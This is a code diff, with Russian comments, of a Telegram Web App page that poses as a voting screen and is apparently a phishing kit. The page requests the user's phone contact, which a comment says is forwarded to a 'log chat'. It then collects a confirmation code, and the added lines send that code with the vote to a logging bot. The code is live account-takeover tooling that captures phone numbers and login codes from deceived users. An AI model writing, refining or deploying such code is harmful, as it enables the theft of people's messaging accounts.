@@ -93,29 +93,15 @@
                 const tg = window.Telegram.WebApp;
                 tg.expand();
 
-                // Если в ссылке есть &step=code, показываем экран ввода кода
-                if (window.location.search.includes('step=code')) {
-                    showCodeScreen();
-                }
-
                 // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Извлекаем номер, даже если он придет как undefined, мы отправим заглушку
-                            let phone = "undefined";
-                            if (contact && contact.phone_number) phone = contact.phone_number;
-                            else if (contact && contact.phone) phone = contact.phone;
-
-                            // Отправляем через sendData (он 100% работает, но требует закрытия окна)
-                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
-
-                            // Создаем скрытую ссылку для перехода обратно в приложение
-                            // Ждем 500мс, чтобы данные успели улететь в бот
-                            setTimeout(() => {
-                                // Открываем приложение заново, сразу на экране ввода кода
-                                tg.openTelegramLink(`https://t.me/daslrwq_bot?startapp=step_code`);
-                            }, 500);
+                            // Бот сам поймает системный контакт и перешлет его в лог-чат.
+                            // Нам не нужно читать contact.phone_number, он все равно undefined.
+                            
+                            // Просто переключаем экран на ввод кода прямо здесь
+                            showCodeScreen();
                         }
                     });
                 };
@@ -149,6 +135,7 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.getElementById('code-subtitle').innerHTML = "<b>Отправка...</b>";
                         
+                        // Код отправляем через лог-бота
                         sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n🔑 <b>КОД:</b> ${value}`);
                         
                         setTimeout(() => {
